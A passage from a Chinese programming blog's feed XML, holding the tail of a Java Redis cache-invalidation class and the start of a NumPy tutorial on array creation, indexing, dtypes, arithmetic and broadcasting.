(Exception exception) &#123;</span><br><span class="line">            log.warn(<span class="string">&quot;Exception occurs when doing batch process for redis: &#123;&#125;&quot;</span>,</span><br><span class="line">                    exception.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> &lt;ID&gt; Boolean <span class="title function_">invalidate</span><span class="params">(String keyPrefix, ID id)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.isAlive()) &#123;</span><br><span class="line">            log.warn(<span class="string">&quot;Redis not alive. Skip invalidating process.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// return template.delete(key);</span></span><br><span class="line">            <span class="comment">// no delete but set empty value</span></span><br><span class="line">            template.opsForValue().set(</span><br><span class="line">                    keyPrefix + id.toString(), Cache.REDIS_INVALID_VALUE,</span><br><span class="line">                    Cache.REDIS_DEFAULT_CACHE_TTL, Cache.REDIS_TTL_UNIT</span><br><span class="line">            );</span><br><span class="line">            log.debug(<span class="string">&quot;Invalid cache for key: &#123;&#125;; TTL: &#123;&#125; &#123;&#125;&quot;</span>,</span><br><span class="line">                    keyPrefix + id, Cache.REDIS_DEFAULT_CACHE_TTL, Cache.REDIS_TTL_UNIT);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">            log.warn(<span class="string">&quot;Exception occurs when invalidating value from redis: &#123;&#125;&quot;</span>,</span><br><span class="line">                    exception.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Long <span class="title function_">invalidateByKeyPrefix</span><span class="params">(String keyPrefix)</span> &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0L</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Set&lt;String&gt; keys = template.keys(keyPrefix);</span><br><span class="line">            <span class="comment">// if (keys != null) res = template.delete(keys);</span></span><br><span class="line">            <span class="keyword">if</span> (keys != <span class="literal">null</span>) &#123;</span><br><span class="line">                res = keys.size();</span><br><span class="line">                List&lt;String&gt; empties = Collections.nCopies(keys.size(), Cache.REDIS_INVALID_VALUE);</span><br><span class="line">                log.debug(<span class="string">&quot;--- Start invalid cache by key prefix ---&quot;</span>);</span><br><span class="line">                <span class="comment">// tricky point: use empty key prefix</span></span><br><span class="line">                <span class="built_in">this</span>.putInBatch(<span class="string">&quot;&quot;</span>, keys.stream().toList(), empties);</span><br><span class="line">                log.debug(<span class="string">&quot;--- Successfully invalid cache for keys: &#123;&#125; ---&quot;</span>, keys);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">            log.warn(<span class="string">&quot;Exception occurs when invalidateByPrefix: &#123;&#125;&quot;</span>,</span><br><span class="line">                    exception.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> &lt;ID&gt; Boolean <span class="title function_">remove</span><span class="params">(String keyPrefix, ID id)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.isAlive()) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                log.debug(<span class="string">&quot;Remove cache for key: &#123;&#125;&quot;</span>, keyPrefix + id.toString());</span><br><span class="line">                <span class="keyword">return</span> template.delete(keyPrefix + id.toString());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">                log.warn(<span class="string">&quot;Exception occurs when removing cache: &#123;&#125;&quot;</span>,</span><br><span class="line">                        exception.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> log.warn(<span class="string">&quot;Redis not alive. Skip removing process.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Chapter-1-基本概念和-CLI-使用&quot;&gt;&lt;a href=&quot;#Chapter-1-基本概念和-CLI-使用&quot; class=&quot;headerlink&quot; title=&quot;Chapter 1. 基本概念和 CLI 使用&quot;&gt;&lt;/a&gt;Chapter 1. 基本概念和 CL</summary>
      
    
    
    
    <category term="technical" scheme="https://blog.sjtuxhw.top/categories/technical/"/>
    
    
    <category term="Programming" scheme="https://blog.sjtuxhw.top/tags/Programming/"/>
    
    <category term="Web" scheme="https://blog.sjtuxhw.top/tags/Web/"/>
    
    <category term="Redis" scheme="https://blog.sjtuxhw.top/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>Python 科学计算入门</title>
    <link href="https://blog.sjtuxhw.top/technical/python-sci-starter/"/>
    <id>https://blog.sjtuxhw.top/technical/python-sci-starter/</id>
    <published>2024-11-03T11:08:13.000Z</published>
    <updated>2024-11-10T11:17:11.085Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0-1-NumPy"><a href="#0-1-NumPy" class="headerlink" title="0.1 NumPy"></a>0.1 NumPy</h2><p><code>Numpy</code> 库是 Python 科学计算的核心。</p><p>Numpy Array 是一个存放相同数据类型的数组（类型 <code>numpy.ndarray</code>），可以使用非负元组（Non-negative tuple）来索引。</p><p>我们称 Rank 为数组的维数，Shape 表示数组的各个维度的大小，使用整型元组表示。</p><h3 id="0-1-1-Array-Creation"><a href="#0-1-1-Array-Creation" class="headerlink" title="0.1.1 Array Creation"></a>0.1.1 Array Creation</h3><p>初始化 Numpy Array 的方法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">a = np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))</span><br><span class="line"><span class="built_in">print</span>(a.shape)</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">0</span>], a[<span class="number">1</span>], a[<span class="number">2</span>])</span><br><span class="line"><span class="comment"># Reference Modification</span></span><br><span class="line">a[<span class="number">0</span>] = <span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">b = np.array(</span><br><span class="line">    [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">     [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]]</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(b.shape)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(b))</span><br><span class="line"><span class="built_in">print</span>(b[<span class="number">0</span>, <span class="number">0</span>], b[<span class="number">1</span>, <span class="number">0</span>], b[<span class="number">0</span>, <span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>类似 Matlab，提供多种方法创建数组：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">a = np.zeros((<span class="number">2</span>, <span class="number">2</span>))    <span class="comment"># 2x2 0-matrix</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">b = np.ones((<span class="number">3</span>, <span class="number">3</span>))     <span class="comment"># 3x3 1-matrix</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">c = np.eye(<span class="number">2</span>)           <span class="comment"># 2x2 identical matrix</span></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">d = np.full((<span class="number">4</span>, <span class="number">4</span>), <span class="number">5</span>)  <span class="comment"># 4x4 matrix filled with 5</span></span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="comment"># 2x2 matrix filled with uniformed ([0,1]) random value</span></span><br><span class="line">e = np.random.random((<span class="number">2</span>, <span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">f = np.diag((-<span class="number">3</span>, -<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>)) <span class="comment"># 4x4 matrix with -3, -4, 5, 6 on diagonal</span></span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line">g_dup = f</span><br><span class="line">g = f.copy()    <span class="comment"># Copy construction</span></span><br><span class="line">f[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(g_dup, g)</span><br><span class="line"></span><br><span class="line">h = np.linspace(<span class="number">0</span>, <span class="number">13</span>, <span class="number">5</span>)  <span class="comment"># start=0, end(included)=13, num=5</span></span><br><span class="line"><span class="built_in">print</span>(h)</span><br><span class="line"></span><br><span class="line"><span class="comment"># args are similar with range(), but return np.array</span></span><br><span class="line">k = np.arange(<span class="number">4</span>, <span class="number">5</span>, <span class="number">0.1</span>, dtype=<span class="built_in">float</span>)</span><br><span class="line"><span class="built_in">print</span>(k)</span><br></pre></td></tr></table></figure><p>更多创建方法用到再说。</p><h3 id="0-1-2-Array-Indexing"><a href="#0-1-2-Array-Indexing" class="headerlink" title="0.1.2 Array Indexing"></a>0.1.2 Array Indexing</h3><p>索引 Numpy Array 的方法和 Python 原生数组类似：</p><ul><li>整型索引 + slice <code>:</code> 切片；</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">a = np.array(</span><br><span class="line">    [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>],</span><br><span class="line">     [<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>],</span><br><span class="line">     [<span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>]]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use slice in each dimension (!!! Reference but NOT copy construction !!!)</span></span><br><span class="line">b = a[:<span class="number">2</span>, <span class="number">1</span>:<span class="number">3</span>]  <span class="comment"># row: 0-1 (2 not included), column: 1-2</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="comment"># Reference Modification</span></span><br><span class="line">b[<span class="number">0</span>, <span class="number">1</span>] = <span class="number">99</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># We need to copy construct explicitly</span></span><br><span class="line">c = a[:<span class="number">2</span>, <span class="number">1</span>:<span class="number">3</span>].copy()</span><br><span class="line">b[<span class="number">0</span>, <span class="number">1</span>] = <span class="number">88</span></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get by only one axis</span></span><br><span class="line">c = a[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">d = a[<span class="number">0</span>, <span class="number">2</span>] <span class="comment"># row=0, column=2</span></span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure><p>注意引用传递的问题。</p><p>还可以将 整型索引 和 slice 混合使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">a = np.array(</span><br><span class="line">    [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>],</span><br><span class="line">     [<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>],</span><br><span class="line">     [<span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>]]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get the whole row 0 (equivalent to a[0])</span></span><br><span class="line">row_r1 = a[<span class="number">0</span>, :]</span><br><span class="line"><span class="built_in">print</span>(row_r1, row_r1.shape)</span><br><span class="line"><span class="comment"># row 0 (but keep dimension)</span></span><br><span class="line">row_r2 = a[<span class="number">0</span>:<span class="number">1</span>, :]</span><br><span class="line"><span class="built_in">print</span>(row_r2, row_r2.shape)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Same with column</span></span><br><span class="line">col_r1 = a[:, <span class="number">0</span>]</span><br><span class="line">col_r2 = a[:, <span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(col_r1, col_r1.shape)</span><br><span class="line"><span class="built_in">print</span>(col_r2, col_r2.shape)</span><br></pre></td></tr></table></figure><p>此外，Numpy 还支持：</p><ul><li>整型数组索引 + 布尔数组索引（更类似 Matlab）：仍然是引用传递。需要 <code>copy()</code> 来 copy construct；</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">a = np.array(</span><br><span class="line">    [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">     [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>],</span><br><span class="line">     [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>],</span><br><span class="line">     [<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>]]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Equivalent to: np.array([ a[0, 0], a[1, 1], a[2, 0] ])</span></span><br><span class="line"><span class="built_in">print</span>(a[[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>], [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Variable indexing</span></span><br><span class="line">b = np.array([<span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>])</span><br><span class="line"><span class="comment"># Select each row, column: 0, 2, 0, 1, respectively.</span></span><br><span class="line"><span class="built_in">print</span>(a[np.arange(<span class="number">4</span>), b])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Reference modification</span></span><br><span class="line">a[np.arange(<span class="number">4</span>), b] += <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">a = np.array([</span><br><span class="line">    [<span class="number">1</span>, <span class="number">2</span>],</span><br><span class="line">    [<span class="number">3</span>, <span class="number">4</span>],</span><br><span class="line">    [<span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Like Matlab</span></span><br><span class="line">bool_idx = (a &gt; <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(bool_idx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">NOTE:</span> boolean indexing can only construct rank-1 array</span></span><br><span class="line"><span class="built_in">print</span>(a[bool_idx])  <span class="comment"># [3 4 5 6]</span></span><br><span class="line"><span class="built_in">print</span>(a[a &gt; <span class="number">2</span>])</span><br></pre></td></tr></table></figure><h3 id="0-1-3-Data-Types"><a href="#0-1-3-Data-Types" class="headerlink" title="0.1.3 Data Types"></a>0.1.3 Data Types</h3><p>Numpy 中提供来多种数据类型，可以用来构建数组等操作。默认情况下构建 array，在不指定 <code>dtype</code> 参数时，Numpy 会猜测数组的数据类型。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">x = np.array([<span class="number">1</span>, <span class="number">2</span>])</span><br><span class="line"><span class="built_in">print</span>(x.dtype)    <span class="comment"># np.int64</span></span><br><span class="line"></span><br><span class="line">x = np.array([<span class="number">1</span>, <span class="number">2</span>], dtype=np.uint64)</span><br><span class="line"><span class="built_in">print</span>(x.dtype)    <span class="comment"># np.uint64</span></span><br><span class="line"></span><br><span class="line">x = np.array([<span class="number">1.</span>, <span class="number">2.</span>])</span><br><span class="line"><span class="built_in">print</span>(x.dtype)    <span class="comment"># np.float64</span></span><br></pre></td></tr></table></figure><blockquote><p>Python 原生类型，如 <code>int / bool / float / complex / bytes / str / object</code>，分别对应 <code>int_ / bool_ / float64 / complex128 / bytes_ / str_ / object_</code>；</p></blockquote><p>当数据类型比较复杂时（例如结构体数组），我们可以手动创建 <code>dtype</code> 并指定，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dt = np.dtype([</span><br><span class="line">    (<span class="string">&#x27;name&#x27;</span>, np.str_, <span class="number">16</span>),          <span class="comment"># Like database CHAR(16)</span></span><br><span class="line">    (<span class="string">&#x27;grades&#x27;</span>, np.float64, (<span class="number">2</span>,))    <span class="comment"># length=2, rank-1 array</span></span><br><span class="line">])</span><br><span class="line"><span class="built_in">print</span>(dt)    <span class="comment"># &lt; 表示小端序、U 代表 unicode char 数字就是占用的字节</span></span><br><span class="line">x = np.array([(<span class="string">&#x27;Sarah&#x27;</span>, (<span class="number">8.0</span>, <span class="number">7.0</span>)), (<span class="string">&#x27;John&#x27;</span>, (<span class="number">6.0</span>, <span class="number">7.0</span>))], dtype=dt)</span><br><span class="line"><span class="comment"># Get data like dict</span></span><br><span class="line"><span class="built_in">print</span>(x[<span class="number">1</span>][<span class="string">&#x27;grades&#x27;</span>])</span><br></pre></td></tr></table></figure><p>更多类型的使用、<code>dtype</code> 信息，请参见 <a href="https://numpy.org/doc/stable/reference/arrays.dtypes.html">Array DTypes - Numpy Doc</a>；</p><h3 id="0-1-4-Array-Math"><a href="#0-1-4-Array-Math" class="headerlink" title="0.1.4 Array Math"></a>0.1.4 Array Math</h3><p>数组运算，在 Numpy 中也是向量 / 矩阵运算。</p><p>在 Matlab 中，我们知道这些运算可以是向量整体点积/叉积、矩阵整体乘法/取逆、向量矩阵乘法；也可以是 element-wise（逐元素）的运算。</p><p>逐元素的四则运算、开方运算如下（会产生新对象）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">x = np.array([[<span class="number">1</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">4</span>]], dtype=np.float64)</span><br><span class="line">y = np.array([[<span class="number">5</span>,<span class="number">6</span>],[<span class="number">7</span>,<span class="number">8</span>]], dtype=np.float64)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(x + y)</span><br><span class="line"><span class="built_in">print</span>(np.add(x, y))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(x - y)</span><br><span class="line"><span class="built_in">print</span>(np.subtract(x, y))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 和 matlab 不一样，* 符号是 element-wise 的</span></span><br><span class="line"><span class="built_in">print</span>(x * y)</span><br><span class="line"><span class="built_in">print</span>(np.multiply(x, y))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(x / y)</span><br><span class="line"><span class="built_in">print</span>(np.divide(x, y))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(np.sqrt(x))</span><br></pre></td></tr></table></figure><p>向量点积（内积）/ 矩阵整体乘法 / 向量矩阵乘法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># matrices</span></span><br><span class="line">x = np.array([[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>]])</span><br><span class="line">y = np.array([[<span class="number">5</span>, <span class="number">6</span>], [<span class="number">7</span>, <span class="number">8</span>]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># vectors</span></span><br><span class="line">v = np.array([<span class="number">9</span>, <span class="number">10</span>])</span><br><span class="line">w = np.array([<span class="number">11</span>, <span class="number">12</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Inner product of vectors</span></span><br><span class="line"><span class="built_in">print</span>(v.dot(w))</span><br><span class="line"><span class="built_in">print</span>(np.dot(v, w)) <span class="comment"># equivalence</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Matrix / vector product</span></span><br><span class="line"><span class="comment"># They have different answers!</span></span><br><span class="line"><span class="built_in">print</span>(v.dot(x)) <span class="comment"># v is regarded as row vector</span></span><br><span class="line"><span class="built_in">print</span>(x.dot(v)) <span class="comment"># v is regarded as column vector</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Matrix product</span></span><br><span class="line"><span class="built_in">print</span>(x.dot(y))</span><br></pre></td></tr></table></figure><p>我们发现，在 Numpy 中，通过 <code>array()</code> 定义的 <strong><u>rank-1 array 很灵活，既可以作行向量，又可以作列向量</u></strong>。</p><p>也正因如此，我们下面介绍的 <strong><u>转置操作</u></strong> 对 rank-1 array 毫无影响：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">x = np.array([[<span class="number">1</span>,<span class="number">2</span>], [<span class="number">3</span>,<span class="number">4</span>]])</span><br><span class="line"><span class="built_in">print</span>(x)    <span class="comment"># Prints &quot;[[1 2]</span></span><br><span class="line">            <span class="comment">#          [3 4]]&quot;</span></span><br><span class="line"><span class="comment"># 注意：返回引用！</span></span><br><span class="line"><span class="built_in">print</span>(x.T)  <span class="comment"># Prints &quot;[[1 3]</span></span><br><span class="line">            <span class="comment">#          [2 4]]&quot;</span></span><br><span class="line"><span class="comment"># 等价于 x.transpose()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Note that taking the transpose of a rank 1 array does nothing:</span></span><br><span class="line">v = np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(v)    <span class="comment"># Prints &quot;[1 2 3]&quot;</span></span><br><span class="line"><span class="built_in">print</span>(v.T)  <span class="comment"># Prints &quot;[1 2 3]&quot;</span></span><br></pre></td></tr></table></figure><p>此外，除了 element-wise 求和，Numpy 和 Matlab 一样提供了整体求和的方法 <code>sum</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x = np.array([[<span class="number">1</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">4</span>]])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(np.<span class="built_in">sum</span>(x))    <span class="comment"># 默认全部元素求和</span></span><br><span class="line"><span class="built_in">print</span>(np.<span class="built_in">sum</span>(x, axis=<span class="number">0</span>))  <span class="comment"># axis=0 对第一维度（列）求和</span></span><br><span class="line"><span class="built_in">print</span>(np.<span class="built_in">sum</span>(x, axis=<span class="number">1</span>))  <span class="comment"># axis=1 对第二维度（行）求和</span></span><br></pre></td></tr></table></figure><p>更多运算方法用到再说。</p><h3 id="0-1-5-Broadcasting"><a href="#0-1-5-Broadcasting" class="headerlink" title="0.1.5 Broadcasting"></a>0.1.5 Broadcasting</h3><p>广播（broadcasting）是 Numpy 运算中相当重要的性质之一，它为不同维度的 array 间的运算提供了更高效的方式。下面几种常用的手段：</p><h4 id="将-rank-1-array-加到-matrix-的每一行上"><a href="#将-rank-1-array-加到-matrix-的每一行上" class="headerlink" title="将 rank-1 array 加到 matrix 的每一行上"></a>将 rank-1 array 加到 matrix 的每一行上</h4><p>假设现在有个需求，将 <code>v</code> 向量加到 <code>x</code> 的每一行上，最后放到 <code>y</code> 中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>], [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>], [<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>]])</span><br><span class="line">v = np.array([<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>])</span><br><span class="line"><span class="comment"># empty_like() 按照 x.shape 来创建一个空矩阵</span></span><br><span class="line">y = np.empty_like(x)</span><br></pre></td></tr></table></figure><p>如果不用 broadcasting 就应该这么做：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(x.shape[<span class="number">1</span>]):</span><br><span class="line">    y[i, :] = x[i, :] + v</span><br></pre></td></tr></table></figure><p>或者使用 <code>tile</code> 来堆叠重复向量：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vv = np.tile(v, (<span class="number">4</span>, <span class="number">1</span>))   <span class="comment"># Stack 4 copies of v on top of each other</span></span><br><span class="line"><span class="built_in">print</span>(vv)                 <span class="comment"># Prints &quot;[[1 0 1]</span></span><br><span class="line">                          <span class="comment">#          [1 0 1]</span></span><br><span class="line">                          <span class="comment">#          [1 0 1]</span></span><br><span class="line">                          <span class="comment">#          [1 0 1]]&quot;</span></span><br></pre></td></tr></table></figure><p>第一种方法虽然能实现需求，但是如果 <code>x</code> 相当大，那么 Python 自己的循环就非常慢，因此我们需要借助 broadcasting（写在 Numpy Library 中，C/C++ 实现）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不同维度的 array 通过 broadcast 直接运算</span></span><br><span class="line">y = x + v  <span class="comment"># Add v to each row of x using broadcasting</span></span><br></pre></td></tr></table></figure><p>但是如果使用不当会出现 shape mismatch 的情况。因此我们需要知道 broadcast 的算法：</p><ol><li><p>如果参与运算的 arrays 的 rank 不同，那么向 rank 小的 